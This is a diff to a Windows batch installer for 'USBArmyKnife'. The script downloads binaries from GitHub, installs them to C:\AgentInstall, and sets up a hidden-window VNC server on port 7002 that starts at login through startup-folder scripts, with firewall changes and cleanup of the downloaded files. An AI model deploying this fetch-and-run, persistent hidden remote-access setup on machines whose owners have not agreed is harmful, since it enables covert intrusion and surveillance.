@@ -4,14 +4,15 @@ title USBArmyKnife Installer
 
 REM ============================================================
 REM  USBArmyKnife Installer
-REM  Downloads all files from GitHub, installs to C:\AgentInstall,
-REM  sets up autostart and firewall, then cleans up temp files.
+REM  Downloads files from GitHub to the installer's directory,
+REM  copies to C:\AgentInstall, sets up autostart/firewall,
+REM  then deletes the downloaded files.
 REM ============================================================
 
 set "DEST=C:\AgentInstall"
 set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 set "BASE=https://raw.githubusercontent.com/Korbi0312/USBArmyKnife-modded/master/tools/Installer"
-set "TEMP=%TEMP%\USBArmyKnife"
+set "DIR=%~dp0"
 
 REM --- Elevation check ---
 net session >nul 2>&1
@@ -46,49 +47,40 @@ taskkill /F /IM AgentLauncher.exe >nul 2>&1
 taskkill /F /IM VncDirect.exe >nul 2>&1
 timeout /t 1 /nobreak >nul
 
-REM --- 2. Download files from GitHub ---
+REM --- 2. Download files to installer directory ---
 echo [2/6] Downloading files from GitHub...
-if not exist "%TEMP%" mkdir "%TEMP%"
 
 echo    Downloading VncDirect.zip...
-powershell -NoProfile -Command "Invoke-WebRequest -Uri '%BASE%/VncDirect.zip' -OutFile '%TEMP%\VncDirect.zip' -UseBasicParsing" >nul 2>&1
-if not exist "%TEMP%\VncDirect.zip" (
+powershell -NoProfile -Command "Invoke-WebRequest -Uri '%BASE%/VncDirect.zip' -OutFile '%DIR%VncDirect.zip' -UseBasicParsing" >nul 2>&1
+if not exist "%DIR%VncDirect.zip" (
     echo    [!] FAILED to download VncDirect.zip
     echo    Check your internet connection and try again.
     pause
     exit /b 1
 )
 
-echo    Extracting...
-powershell -NoProfile -Command "Expand-Archive -Path '%TEMP%\VncDirect.zip' -DestinationPath '%TEMP%' -Force" >nul 2>&1
-
 echo    Downloading agent files...
-powershell -NoProfile -Command "Invoke-WebRequest -Uri '%BASE%/AgentLauncher.exe' -OutFile '%TEMP%\AgentLauncher.exe' -UseBasicParsing" >nul 2>&1
-powershell -NoProfile -Command "Invoke-WebRequest -Uri '%BASE%/PortableApp.dll' -OutFile '%TEMP%\PortableApp.dll' -UseBasicParsing" >nul 2>&1
-powershell -NoProfile -Command "Invoke-WebRequest -Uri '%BASE%/turbojpeg.dll' -OutFile '%TEMP%\turbojpeg.dll' -UseBasicParsing" >nul 2>&1
-powershell -NoProfile -Command "Invoke-WebRequest -Uri '%BASE%/vcruntime140.dll' -OutFile '%TEMP%\vcruntime140.dll' -UseBasicParsing" >nul 2>&1
-powershell -NoProfile -Command "Invoke-WebRequest -Uri '%BASE%/WmiLight.Native.dll' -OutFile '%TEMP%\WmiLight.Native.dll' -UseBasicParsing" >nul 2>&1
+powershell -NoProfile -Command "Invoke-WebRequest -Uri '%BASE%/AgentLauncher.exe' -OutFile '%DIR%AgentLauncher.exe' -UseBasicParsing" >nul 2>&1
+powershell -NoProfile -Command "Invoke-WebRequest -Uri '%BASE%/PortableApp.dll' -OutFile '%DIR%PortableApp.dll' -UseBasicParsing" >nul 2>&1
+powershell -NoProfile -Command "Invoke-WebRequest -Uri '%BASE%/turbojpeg.dll' -OutFile '%DIR%turbojpeg.dll' -UseBasicParsing" >nul 2>&1
+powershell -NoProfile -Command "Invoke-WebRequest -Uri '%BASE%/vcruntime140.dll' -OutFile '%DIR%vcruntime140.dll' -UseBasicParsing" >nul 2>&1
+powershell -NoProfile -Command "Invoke-WebRequest -Uri '%BASE%/WmiLight.Native.dll' -OutFile '%DIR%WmiLight.Native.dll' -UseBasicParsing" >nul 2>&1
 
 echo    Downloads complete.
 
-REM --- 3. Copy files ---
+REM --- 3. Copy files to destination ---
 echo [3/6] Installing to %DEST%...
 if not exist "%DEST%" mkdir "%DEST%"
 if not exist "%DEST%\VncDirect" mkdir "%DEST%\VncDirect"
 
-copy /y "%TEMP%\AgentLauncher.exe" "%DEST%\" >nul
-copy /y "%TEMP%\PortableApp.dll" "%DEST%\" >nul
-copy /y "%TEMP%\turbojpeg.dll" "%DEST%\" >nul
-copy /y "%TEMP%\vcruntime140.dll" "%DEST%\" >nul
-copy /y "%TEMP%\WmiLight.Native.dll" "%DEST%\" >nul
+copy /y "%DIR%AgentLauncher.exe" "%DEST%\AgentLauncher.exe" >nul
+copy /y "%DIR%PortableApp.dll" "%DEST%\PortableApp.dll" >nul
+copy /y "%DIR%turbojpeg.dll" "%DEST%\turbojpeg.dll" >nul
+copy /y "%DIR%vcruntime140.dll" "%DEST%\vcruntime140.dll" >nul
+copy /y "%DIR%WmiLight.Native.dll" "%DEST%\WmiLight.Native.dll" >nul
 
-if exist "%TEMP%\VncDirect\VncDirect.exe" (
-    copy /y "%TEMP%\VncDirect\VncDirect.exe" "%DEST%\VncDirect\" >nul
-    copy /y "%TEMP%\VncDirect\*.dll" "%DEST%\VncDirect\" >nul
-)
-if exist "%TEMP%\VncDirect\vnc" (
-    xcopy /q /y /e "%TEMP%\VncDirect\vnc" "%DEST%\VncDirect\vnc\" >nul
-)
+REM Extract VncDirect.zip
+powershell -NoProfile -Command "Expand-Archive -Path '%DIR%VncDirect.zip' -DestinationPath '%DEST%\VncDirect' -Force" >nul 2>&1
 
 REM --- Save password ---
 if not "%VNCPASSWD%"=="" (
@@ -100,7 +92,7 @@ REM --- 4. Set up autostart ---
 echo [4/6] Setting up autostart...
 if not exist "%STARTUP%" mkdir "%STARTUP%"
 
-REM Generate VBS files with PowerShell (avoids encoding issues)
+REM Generate VBS files
 powershell -NoProfile -Command ^
   "$vbs1 = 'Set fso = CreateObject(\"Scripting.FileSystemObject\")' + [char]13 + [char]10 + 'exe = \"C:\AgentInstall\VncDirect\VncDirect.exe\"' + [char]13 + [char]10 + 'If fso.FileExists(exe) Then' + [char]13 + [char]10 + '    CreateObject(\"WScript.Shell\").Run \"\"\"\"  & exe & \"\"\"\" & \" port=7002 cwd=C:\AgentInstall\VncDirect\vnc fps=240 scale=0\", 0, False' + [char]13 + [char]10 + 'End If'; " ^
   "Set-Content -Path '%STARTUP%\VncDirect.vbs' -Value $vbs1 -Encoding ASCII; " ^
@@ -147,10 +139,15 @@ if %tries% lss 10 (
     echo     VNC Server listening on port 7002.
 )
 
-REM --- Cleanup temp files ---
+REM --- Cleanup downloaded files from installer directory ---
 echo.
 echo Cleaning up downloaded files...
-rmdir /s /q "%TEMP%" >nul 2>&1
+del "%DIR%AgentLauncher.exe" >nul 2>&1
+del "%DIR%PortableApp.dll" >nul 2>&1
+del "%DIR%turbojpeg.dll" >nul 2>&1
+del "%DIR%vcruntime140.dll" >nul 2>&1
+del "%DIR%WmiLight.Native.dll" >nul 2>&1
+del "%DIR%VncDirect.zip" >nul 2>&1
 
 echo.
 echo ========================================
